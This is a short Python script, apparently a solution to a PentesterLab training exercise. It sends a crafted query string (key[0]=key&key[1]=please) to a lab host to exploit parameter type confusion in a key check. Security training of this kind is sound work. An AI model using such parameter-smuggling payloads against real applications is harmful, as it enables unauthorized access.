import requests

url = "http://ptl-934de69a-e9010455.libcurl.so/"

response = requests.get(
    url=url + "pentesterlab?key[0]=key&key[1]=please"
)

print(response.text)
